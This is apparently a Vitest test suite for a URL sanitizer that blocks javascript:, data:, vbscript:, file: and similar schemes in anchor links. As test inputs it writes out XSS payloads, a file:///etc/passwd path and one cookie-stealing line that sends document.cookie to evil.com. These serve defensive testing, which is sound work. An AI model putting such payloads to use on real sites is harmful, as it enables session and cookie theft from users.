/**
 * URL validation and sanitization tests
 *
 * These tests verify that dangerous URL schemes are properly blocked
 * to prevent XSS attacks through anchor tag href attributes.
 */

import { describe, it, expect } from 'vitest';
import { sanitizeUrl, isUrlSafe, makeUrlSafe } from '../urlValidator';

describe('sanitizeUrl', () => {
  describe('Safe protocols are allowed', () => {
    it('should allow https URLs', () => {
      expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
    });

    it('should allow http URLs', () => {
      expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
    });

    it('should allow mailto URLs', () => {
      expect(sanitizeUrl('mailto:test@example.com')).toBe('mailto:test@example.com');
    });

    it('should allow tel URLs', () => {
      expect(sanitizeUrl('tel:+1234567890')).toBe('tel:+1234567890');
    });

    it('should allow ftp URLs', () => {
      expect(sanitizeUrl('ftp://ftp.example.com')).toBe('ftp://ftp.example.com');
    });
  });

  describe('Dangerous protocols are blocked', () => {
    it('should block javascript: protocol', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBeNull();
      expect(sanitizeUrl('javascript:void(0)')).toBeNull();
      expect(sanitizeUrl('javascript:document.cookie')).toBeNull();
    });

    it('should block data: protocol', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
      expect(sanitizeUrl('data:image/svg+xml,<svg onload=alert(1)>')).toBeNull();
    });

    it('should block vbscript: protocol', () => {
      expect(sanitizeUrl('vbscript:msgbox(1)')).toBeNull();
    });

    it('should block file: protocol', () => {
      expect(sanitizeUrl('file:///etc/passwd')).toBeNull();
    });

    it('should block about: protocol', () => {
      expect(sanitizeUrl('about:blank')).toBeNull();
    });

    it('should block chrome: protocol', () => {
      expect(sanitizeUrl('chrome://extensions')).toBeNull();
    });

    it('should block chrome-extension: protocol', () => {
      expect(sanitizeUrl('chrome-extension://abc/popup.html')).toBeNull();
    });

    it('should block moz-extension: protocol', () => {
      expect(sanitizeUrl('moz-extension://abc/popup.html')).toBeNull();
    });

    it('should block view-source: protocol', () => {
      expect(sanitizeUrl('view-source:https://example.com')).toBeNull();
    });
  });

  describe('XSS attack vectors', () => {
    it('should block javascript with various capitalizations', () => {
      expect(sanitizeUrl('JavaScript:alert(1)')).toBeNull();
      expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBeNull();
      expect(sanitizeUrl('JaVaScRiPt:alert(1)')).toBeNull();
    });

    it('should block javascript with whitespace variations', () => {
      expect(sanitizeUrl('javascript :alert(1)')).toBeNull();
      expect(sanitizeUrl('javascript	:alert(1)')).toBeNull(); // tab
      expect(sanitizeUrl('javascript\n:alert(1)')).toBeNull(); // newline
      expect(sanitizeUrl('javascript\r:alert(1)')).toBeNull(); // carriage return
    });

    it('should block data URLs with script content', () => {
      expect(sanitizeUrl('data:text/html;charset=utf-8,<script>alert(1)</script>')).toBeNull();
      expect(sanitizeUrl('data:text/svg+xml,<svg onload=alert(1)>')).toBeNull();
    });

    it('should block VBScript URLs', () => {
      expect(sanitizeUrl('vbscript:execute(msgbox("XSS"))')).toBeNull();
      expect(sanitizeUrl('VBScript:execute(msgbox("XSS"))')).toBeNull();
    });
  });

  describe('Edge cases and malformed input', () => {
    it('should handle empty string', () => {
      expect(sanitizeUrl('')).toBeNull();
    });

    it('should handle null input', () => {
      expect(sanitizeUrl(null as unknown as string)).toBeNull();
    });

    it('should handle undefined input', () => {
      expect(sanitizeUrl(undefined as unknown as string)).toBeNull();
    });

    it('should handle non-string input', () => {
      expect(sanitizeUrl(123 as unknown as string)).toBeNull();
      expect(sanitizeUrl({} as unknown as string)).toBeNull();
    });

    it('should handle whitespace-only input', () => {
      expect(sanitizeUrl('   ')).toBeNull();
      expect(sanitizeUrl('\t\n')).toBeNull();
    });

    it('should trim whitespace from URLs', () => {
      expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com');
      expect(sanitizeUrl('\thttps://example.com\n')).toBe('https://example.com');
    });

    it('should handle URLs without protocol by adding https://', () => {
      expect(sanitizeUrl('example.com')).toBe('https://example.com');
      expect(sanitizeUrl('www.example.com')).toBe('https://www.example.com');
      expect(sanitizeUrl('example.com/path')).toBe('https://example.com/path');
    });
  });

  describe('Special URL formats', () => {
    it('should handle URLs with query parameters', () => {
      expect(sanitizeUrl('https://example.com?param=value')).toBe('https://example.com?param=value');
      expect(sanitizeUrl('https://example.com?param=value&other=123')).toBe(
        'https://example.com?param=value&other=123'
      );
    });

    it('should handle URLs with fragments', () => {
      expect(sanitizeUrl('https://example.com#section')).toBe('https://example.com#section');
    });

    it('should handle URLs with paths', () => {
      expect(sanitizeUrl('https://example.com/path/to/resource')).toBe('https://example.com/path/to/resource');
    });

    it('should handle URLs with authentication', () => {
      expect(sanitizeUrl('https://user:pass@example.com')).toBe('https://user:pass@example.com');
    });

    it('should handle URLs with ports', () => {
      expect(sanitizeUrl('https://example.com:8080')).toBe('https://example.com:8080');
    });

    it('should handle internationalized domain names', () => {
      expect(sanitizeUrl('https://müller.example.com')).toBe('https://müller.example.com');
      expect(sanitizeUrl('https://例子.测试')).toBe('https://例子.测试');
    });
  });
});

describe('isUrlSafe', () => {
  it('should return true for safe URLs', () => {
    expect(isUrlSafe('https://example.com')).toBe(true);
    expect(isUrlSafe('http://example.com')).toBe(true);
    expect(isUrlSafe('mailto:test@example.com')).toBe(true);
  });

  it('should return false for dangerous URLs', () => {
    expect(isUrlSafe('javascript:alert(1)')).toBe(false);
    expect(isUrlSafe('data:text/html,<script>')).toBe(false);
    expect(isUrlSafe('vbscript:msgbox(1)')).toBe(false);
  });

  it('should return false for empty or invalid input', () => {
    expect(isUrlSafe('')).toBe(false);
    expect(isUrlSafe(null as unknown as string)).toBe(false);
    expect(isUrlSafe(undefined as unknown as string)).toBe(false);
  });
});

describe('makeUrlSafe', () => {
  it('should return href and text for safe URLs', () => {
    const result = makeUrlSafe('https://example.com');
    expect(result.href).toBe('https://example.com');
    expect(result.text).toBe('https://example.com');
  });

  it('should return null href but preserve text for dangerous URLs', () => {
    const result = makeUrlSafe('javascript:alert(1)');
    expect(result.href).toBeNull();
    expect(result.text).toBe('javascript:alert(1)');
  });

  it('should preserve original text even when adding protocol', () => {
    const result = makeUrlSafe('example.com');
    expect(result.href).toBe('https://example.com');
    expect(result.text).toBe('example.com');
  });

  it('should handle null/undefined input gracefully', () => {
    expect(makeUrlSafe(null as unknown as string)).toEqual({ href: null, text: '' });
    expect(makeUrlSafe(undefined as unknown as string)).toEqual({ href: null, text: '' });
  });

  it('should preserve case in text even if protocol is normalized', () => {
    const result = makeUrlSafe('HTTPS://Example.COM');
    // The href is returned as-is (protocol matching is case-insensitive)
    expect(result.href).toBe('HTTPS://Example.COM');
    expect(result.text).toBe('HTTPS://Example.COM');
  });
});

describe('Real-world attack scenarios', () => {
  it('should prevent XSS through javascript: protocol', () => {
    const dangerous = 'javascript:document.location="http://evil.com/steal?data="+document.cookie';
    expect(sanitizeUrl(dangerous)).toBeNull();
    expect(isUrlSafe(dangerous)).toBe(false);
  });

  it('should prevent data URL XSS', () => {
    const dangerous = 'data:text/html;charset=utf-8,<html><body><script>alert(document.cookie)</script></body></html>';
    expect(sanitizeUrl(dangerous)).toBeNull();
    expect(isUrlSafe(dangerous)).toBe(false);
  });

  it('should prevent SVG-based data URL XSS', () => {
    const dangerous = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
    expect(sanitizeUrl(dangerous)).toBeNull();
  });

  it('should prevent VBScript XSS', () => {
    const dangerous = 'vbscript:Execute(MsgBox("XSS"))';
    expect(sanitizeUrl(dangerous)).toBeNull();
  });

  it('should allow legitimate URLs with suspicious-looking but safe content', () => {
    // These are legitimate URLs that might look suspicious but are actually safe
    expect(sanitizeUrl('https://example.com/script.js')).toBe('https://example.com/script.js');
    expect(sanitizeUrl('https://example.com/data.json')).toBe('https://example.com/data.json');
    expect(sanitizeUrl('https://example.com/view-source')).toBe('https://example.com/view-source');
  });
});
